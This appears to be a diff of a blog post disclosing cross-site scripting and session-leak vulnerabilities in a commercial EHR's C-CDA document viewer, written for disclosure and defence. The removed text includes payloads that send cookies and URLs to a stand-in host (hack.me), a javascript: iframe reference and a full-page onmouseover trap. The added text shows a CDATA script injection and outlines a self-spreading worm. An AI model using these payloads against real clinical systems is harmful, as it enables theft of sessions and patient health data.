@@ -1,298 +1,154 @@
-### TL;DR: If you're using XSLT "stylesheets" to render C-CDAs from external sources, it's essential that you understand the security considerations described below, or you may risk data breach.
+## Security vulnerabilities in C-CDA display: a case study
 
-## Vulnerabilty report
+## For background
 
-Last week I discovered a security vulnerability in a **well-known commericial
-EHR product** that I'll pseudonomously call "Friendly Web EHR". I reported it
-to the vendor; they fixed the problem; and this is the write-up. But the story
-may not be finished: the vulnerability was a result, in part, of the
-vendor's reliance on an XML Transform or "stylesheet" provided by HL7 as an
-accompaniment to the C-CDA specification, which means...
+See my [smartplatforms.org blog
+post](http://smartplatforms.org/2014/04/security-vulnerabilities-in-ccda-display/)
+describing the details of three security vulnerabilities in C-CDA Display using
+CDA.xsl in HL7's CDA.xsl.
 
-### Other EHR vendors may be affected too
+## The story
 
-It's very likely that other vendor products are affected, so if your product
-displays C-CDA documents as HTML, please have somone from your security team
-review this post-mortem, understand the risks, and ensure that the proposed
-fixes are in place.
 
-### View a document → suffer a data breach
+Last month I discovered a set of security vulnerabilities in a **well-known
+commericial EHR product** that I'll pseudonomously call "Friendly Web EHR".
+Here's the story...
 
-The short story is: Friendly Web EHR's C-CDA viewer was vulnerable to
-cross-site scripting attacks. If a clinical user merely *viewed* a malicous
-C-CDA, that document could proceed to execute JavaScript code in the browser,
-steal the user's EHR session tokens, and relay them to a third party.
+### Discovery
 
-Let me say that again: simply viewing a document could cause a clinician to
-leak full EHR priviliges to a remote third party attacker. The attacker could
-then proceed to download data about any patient in the practice.
+I was poking around my account in Friendly Web EHR, examining MU2 features like
+C-CDA display and Direct messaging. I use the "file upload" feature to upload
+some sample documents from SMART's [Sample C-CDA Repository on
+GitHub](https://github.com/chb/sample_ccdas) to see how well they rendered. At
+the time, I was thinking about the user experience. (Specifically, I was
+bemoaning how clunky the standard XSLT-based C-CDA rendering looks.) I was
+curious to see how the C-CDA viewer was embedded into the EHR. Direct DOM
+insertion? Inline frames? I opened up Chrome Developer Tools to take a look.
 
-#### This kind of thing can get bad *fast*
-A clever attacker might chain this kind of vulnerability into a **viral vector** 
-that could spread across practices. By manipulating a vendor's internal API
-the attacker might use stolen session tokens to:
+It turned out to be an `iframe` pointing to a standalone C-CDA viewer module.
+Interestingly the `src` URL of the iframe included two URL parameters: an
+identifier for the document that I was viewing, and some kind of security
+token. A bit of investigation revealed that this token was identical to my main
+EHR session token: in other words, a full session-equivalent was embedded into
+the `iframe/@src` URL.
 
-1. Fetch all contacts from a user's address book
-2. Spam all contacts with a referral note or Direct message that included an infected C-CDA document 
-3. Harvest vast amounts of protected health information
+This was dangerous, because it meant that a malicious document could steal my
+EHR session merely by leaking its own URL to an attacker. This kind of leakage
+occurs by default in modern web browsers, in the form of `Referer` headers:
+every time a typical browser fetchese external resources like an image, it
+includes a header with the URL of the current page.  So if I could merely
+reference an external image in my C-CDA, I'd have an attack vector.
 
-### See it in action
+I started looking through HL7's [example
+stylesheet](https://github.com/chb/sample_ccdas/blob/b052e21f8f314b49753d8f74967ac40ea5c30948/CDA.xsl)
+and saw that the
+[`renderMultiMedia`](https://github.com/chb/sample_ccdas/blob/b052e21f8f314b49753d8f74967ac40ea5c30948/CDA.xsl#L1285)
+template allowed the creation of `img` tags with an arbitrary `src` attribute.
+That would be all I needed...
 
-If you like to learn by poking under the covers, then poke around this re-enactment...
+But it occurred to me that a 2274-line XSLT file written in 2008 probably had
+other vulnerabilities. I started hunting for loopholes that would allow
+execution of javascript code, and I discovered the [two vulnerabilities I
+described in my SMART Platforms blog
+post](http://smartplatforms.org/2014/04/security-vulnerabilities-in-ccda-display/).
 
-* source @ https://github.com/chb/ccda-xslt-vulnerabilities
-* demo @ https://chb.github.io/ccda-xslt-vulnerabilities
+I decided to try these out against my own account in Friendly Web EHR, and sure enough I was able to:
 
-### Two fundamental attacks
+1. Leak a session token back to a remote server, and
+2. Execute arbitrary JavaScript in the browser, accessing cookies as well as a
+   session token
 
-Many vendors appear to be using (slightly modified) versions of the
-[CDA.xsl](https://github.com/chb/sample_ccdas/blob/master/CDA.xsl) that comes
-with HL7's C-CDA release. This provides potential attackers with a highly
-visible, leveragable target.
 
-Based on my analysis of the XSLT, there are at least two ways to craft a
-malacious C-CDA. We'll discuss both in detail:
+> If you're interested in exploring a low-fidelity re-creation of the
+> vulnerable C-CDA viewer, I've put together a working [simulation that
+> demonstrates the key
+> issues](http://chb.github.io/ccda-xslt-vulnerabilities/). Don't worry: it's
+> just a demonstration, and perfectly safe to view!
+> [*simulation*](https://chb.github.io/ccda-xslt-vulnerabilities) | 
+> [*source*](https://github.com/chb/ccda-xslt-vulnerabilities)
 
-1. Contrive to place `img` tags in the rendered document that leak application
-   state in an HTTP `Referer` header.
-2. Contrive to execute JavaScript code anytime the C-CDA is loaded (cross-site
-   scripting).
+At this point, about 5pm on a Saturday, I reported the discovery by e-mail to a
+contact at Friendly Web EHR. I heard back Sunday evening with a request for
+more details. I provided these, including an example document demonstrating the
+vulnerabilities (see the simulation above). They confirmed the vulnerabilities,
+and over a few follow-up sessions we discussed the problems in detail. By that
+Thursday night (five days after the report) they had a fix in place.
 
-#### Leaking application state through externally loaded images
+### Round two: non-XSLT viewers and viral vectors
 
-Searching CDA.xsl for the term `img`, we see there are two places where this
-stylesheet can output image tags. Both occur within the `renderMultiMedia`
-template definition:
+When I returned to Friendly Web EHR after the initial fix was ready, I realized
+that the EHR actually included two different C-CDA viewers. The one I had
+initially explored was based on HL7's CDA.xsl, but a second viewer offered a
+much more compelling user experience. This second viewer was built directly
+into the EHR's Direct inbox feature, and could be used to open C-CDA
+attachments to Direct messages.
 
-```
-<xsl:template match="n1:renderMultiMedia">
-  <xsl:variable name="imageRef" select="@referencedObject" />
-      <!-- snipped for brevity -->
-      <xsl:if
-        test="//n1:observationMedia[@ID=$imageRef]/n1:value[@mediaType='image/gif' or @mediaType='image/jpeg']">
-        <br clear="all" />
-        <xsl:element name="img">
-          <xsl:attribute name="src"><xsl:value-of
-              select="//n1:observationMedia[@ID=$imageRef]/n1:value/n1:reference/@value" /></xsl:attribute>
-        </xsl:element>
-      </xsl:if>
-      <!-- snipped for brevity -->
-</xsl:template>
-```
+When I looked through the JavaScript source code, I noticed Friendly Web EHR
+used the [Handlebars](http://handlebarsjs.com/) templating library to insert a
+C-CDA view into the Direct inbox -- and that view was inserted using an
+unscaped markup expression (handlebars syntax: `{{{ unescaped_markup_here
+}}}`). This was potentially an opportunity to inject rogue markup into the DOM.
 
-By constructing an appropriate `section` in a C-CDA document to act as input to
-the template above, we can cause the browser to leak the current page URL to
-`https://hack.me`:
+I set up a [HealthVault](https://www.healthvault.com) account and discovered
+that as a patient, I could send Direct messages to my clinician account in
+Friendly Web EHR. Using this account, I tried sending documents with the
+exploits that I had discovered in my CDA.xsl explorations, but to no avail.
 
-```
-<text>
-  This image loads from an external server...
-  <renderMultiMedia referencedObject="MM1"></renderMultiMedia>
-</text>
-<entry>
-  <observationMedia ID="MM1">
-    <id root="10.23.4567.345"/>
-    <value xsi:type="ED" mediaType="image/jpeg">
-      <reference value="https://hack.me/leaked-from-image.png"/>
-    </value>
-  </observationMedia>
-</entry>
-```
-
-#### Executing arbitrary JavaScript from a C-CDA document 
-
-##### Via `iframe` in nonXMLBody
-One interesting opportunity for injection attacks is the default handling of a `nonXMLBody` CDA. 
+And then on a hunch I tried adding a `CDATA` block to a C-CDA narrative text
+element, to create something like:
 
 ```
-<xsl:template match='n1:component/n1:nonXMLBody'>
-  <xsl:choose>
-  <!-- if there is a reference, use that in an IFRAME -->
-  <xsl:when test='n1:text/n1:reference'>
-  <IFRAME name='nonXMLBody' id='nonXMLBody' WIDTH='80%' HEIGHT='600' src='{n1:text/n1:reference/@value}' />
-</xsl:when>
-```
-
-Yikes! This means we can get javascript to execute if we can supply it in a reference like:
-
-```
-<nonXMLBody>
+<section>
   <text>
-    <reference value="javascript:alert(window.parent.location);"/>
+    <![CDATA[
+       <script>
+          alert('document.cookie');
+       </script>
+    ]]>
   </text>
-</nonXMLBody>
+</section>
 ```
 
-##### Via rogue attributes
-
-Where else can we look for weaknesses? Well, it would be "nice" to find a way
-to get a `script` tag inserted in the rendered document, but the XSLT is pretty
-careful about creating new elements. There are a few programmatic calls to
-`xsl:element`, but they all include hard-coded values for the element name.
-We'll have to think outside of the box...
-
-Well, there are various ways to execute JavaScript within a Web page -- and
-they include `onmouseover` attributes. Looking through attribute handling, we
-see a highly permissive "copy all" strategy applied to the attributes on a table:
+This resulted in HTML that was *close* to what I needed, but the opening
+`script` tag was wrapped in a comment block. Something like:
 
 ```
-<!-- Tables -->
-<xsl:template
-  match="n1:table/@*|n1:thead/@*|n1:tfoot/@*|n1:tbody/@*|n1:colgroup/@*|n1:col/@*|n1:tr/@*|n1:th/@*|n1:td/@*">
-  <xsl:copy>
-    <xsl:copy-of select="@*" />
-    <xsl:apply-templates />
-  </xsl:copy>
+ <!-- <script> -->
+ alert('document.cookie');
+ </script>
 ```
 
-What this says is: "when you find a `table` in the C-CDA document, just copy
-all of its XML attributes right into the rendered document. Bingo! We can use
-this to inject JavaScript in the resulting document. For example, we can easily
-steal cookies and pass them back to an external server with:
-something like:
+Again on a hunch, I tweaked my payload by duplicating the opening `<script>`
+tag -- and sure enough, I was able to inject JavaScript into the EHR session!
 
-```
-<table onmouseover="
-  var i=document.createElement('img');
-  i.style.display='none';
-  i.src='https://hack.me/from/'+
-        encodeURIComponent(document.URL)+
-        '/cookie/'+
-        encodeURIComponent(document.cookie);
-  document.body.appendChild(i);"></table>
-```
+## Serious danger: potential for viral spread
 
-That's a good start but it'll only ever work if the user moves the mouse
-over what could be a small, isolated table in the C-CDA document. Let's fix
-that with some snazzy styling:
+This vulnerability was potentially far more concerning than the earlier ones,
+because it was an issue with the C-CDA viewer attached to Friendly Web EHR's
+Direct inbox.  What this means is that a motivated attacker could turn this
+vulnerability into a viral (self-spreading) vector, by following a sequence of
+steps like:
 
-```
-<table style="height: 100%;
-              z-index: 10;
-              width: 100%;
-              position: fixed;
-              left: 0px;
-              top: 0px;" 
-       onmouseover="[as before]" style=""></table>
-```
+1. Craft a malicious document and send it via Direct message to any Friendly
+   Web EHR clinician.
 
-Now our infected table covers the entire document area, so moving the mouse
-anywhere within the document will cause our code to run. That's more like it!
-You may want to [check out these tricks in
-action](https://chb.github.io/chb/ccda-xslt-vulnerabilities).
+2. When viewed, the document hijacks a user's EHR session and issues a set of
+   calls to Friendly Web EHR's internal (undocumented) API.
 
-## How to protect yourself: a defense-in-depth approach
+3. API call to fetch a clinician's contacts from her address book.
 
-There are many, many ways to defend against an attack like this. In one sense,
-it's not at all hard. But mistakes can be subtle, so it's extremely valuable to
-protect yourself in a systematic way. By thinking
-systematically, you can help prevent not only the attacks that you're
-imaginitive enough to foresee, but others, too.
+4. API call to send a new Direct message to each contact, containing a new copy
+   of the malicious document.  (To make this realisitic, it would be designed
+   to look like a referral note with patient data attached.)
 
-We'll discuss strategies to:
+This sequence of steps could allow an attacker to harvest large quantities of
+protected health information in short order.
 
-1. Keep bad documents out
-2. If bad documents get in, prevent them from running code in the browser
-3. If bad documents run code in the browser, ensure they can't steal critical application state like security tokens
-4. If bad documents steal security tokens, limit the damage
+## Wrapping up
 
-### Keep bad documents out
+I reported this additional vulnerability to Friendly Web EHR, and they fixed it
+by the following Thursday.
 
-The simplest practice here is to validate all incoming C-CDA documents against
-the official CDA schema from HL7. Unfortunately the schema aren't easily
-accessible on the Web (like so much of HL7's output), so the best I can do is
-[link to the
-zip](https://www.hl7.org/documentcenter/private/standards/cda/CDAR2_IG_IHE_CONSOL_DSTU_R1dot1_2012JUL.zip)
-that contains the schema. This validation would reject documents containing
-invalid attributes like `onmouseover` or `style`:
-
-```
-$ xmllint --schema CDA.xsd  potentially-valid-ccda.xml
-
-Schemas validity error: 
-  Element '{urn:hl7-org:v3}table', attribute 'onmousover':
-    The attribute 'onmousover' is not allowed.
-```
-
-That's certainly a good start -- and if Friendly Web EHR had done something
-like this before passing a C-CDA document into an XSL transform process, they
-wouldn't have been vulnerable to the "rogue attributes" attack described above.
-
-But validation alone won't ensure safety... you also need to
-
-
-### Prevent documents from running code or loading external images
-
-The next line of defense is to ensure that bad documents can't do bad things,
-even if they do make it into our system. There are two key recommendations here:
-
-1. Fix up the XSLT. Specifically: augment it to prevent blindly copying "all attributes" when
-   rendering tables, and consider blocking external images as well).
-
-2. Load the rendered C-CDA inside `<iframe SANDBOX="">` to prevent any
-   JavaScript from running. This won't work on all browsers, but it provides an
-extra measure of protection [where it does
-work](http://caniuse.com/#feat=iframe-sandbox).
-
-### Prevent documents from stealing critical application state even if they can run code or load images
-
-Let's assume all our defenses up to this point have failed. With the right
-protections in place, we can stay safe. At this level, we want to ensure that
-C-CDAs are rendered and displayed in a "protected" environment, which means:
-
- * **No secret state embedded in the URL**. For example, it's a bad practice to
-   use `iframe` source URLs with embedded tokens like
-`/patient/john-smith/ccda/rendered?secret_token=123abc`. If you need to pass
-credential to your C-CDA viewer, do it via `POST` instead of `GET`, or hide the
-logic behind a token-stripping `redirect`. 
-
- * **No secret state in JavaScript-accessible cookies**. If you're using cookies
-   for authentication, ensure that they're inaccessible to JavaScript (that is:
-use the `httpOnly` flag, and `secure` for good measure).
-
- * **No shared origin with the parent frame**. If your `iframe` share its
-   origin with the parent frame, then any code running within the `iframe` has
-full access to the application state of the parent frame. This is dangerous! (
-(See the effect of a compromise in  [the demo](https://chb.github.io/chb/ccda-xslt-vulnerabilities).) 
-It's safer to load the C-CDA viewer in its own origin, where it simply can't
-"see" the surrounding application. Better still, ensure that the C-CDA viewer
-does not share a subdomain with the parent window, to ensure there is not even
-an opportunity for shared cookies. 
-
-### Limit the damage of exposed tokens
-
-If all else fails, we can endeavor to limit the damage from leaked tokens. At this
-point we're already dealing with a breach of protected health information, but
-a small breach is much, much better than a massive one.  In this category we
-have approaches like:
-
- * Bind sessions to end-user IP addresses, or at least geographical regions. If
-   an attacker does steal a session token, we can still prevent the wholesale
-   exposure of patient data directly to a remote sever.  Keep in mind that
-this isn't an ircon-clad fix. An attacker can always hijack the end-user's
-browser to execute and proxy arbitrary HTTP requests. For a vivid depiction of
-how bad things can get, and how fast, see Krzysztof Kotowicz's [detailed blog
-post](http://blog.kotowicz.net/2013/12/rapportive-xsses-gmail-or-have-yourself.html) (and especially the video!)
-describing the exploitation of a vulnerability in the
-[Rapportive](https://rapportive.com/) Chrome extension.
-
- * Monitor access patterns in realtime, and respond to anomolous behavior. Too
-   many requests using a given access token, over too short a period of time,
-for example, should trigger session expiration and user account locking.
-
-
-## Bugs happen. Be prepared!
-
-In any complex system, bugs -- including security vulnerabilities -- are a fact of life.
-But an important part of being prepared is having a well-defined channel for 
-security researchers, concerned citizens, and others to reach out
-and report what they find. This could take the form of:
-
- * Bug Bounty or "Whitehat" program like [Facebook's](https://www.facebook.com/whitehat)
- * Well-defined vulnerability reporting page like [Twitter's](https://support.twitter.com/forms/security)
-
-These programs sometimes award fame, or cash -- but they key point is that they provide 
-a single "right way" to report issues.  Here's a [whole list of programs](https://bugcrowd.com/list-of-bug-bounty-programs/) that
-you can explore.
-
-Security in EHRs is a sensitive topic, and rightfully so. But a culture of transparency and recognition is among the best protections. I urge every EHR vendor to look at reporting programs described above, and please use them to model your own!
+In the meantime, I attempted to contact every Web-based EHR vendor I could
+identify, to notify them about the CDA.xsl vulnerabilities. I'll describe the
+discouraging results of that reporting effort in a subsequent post!
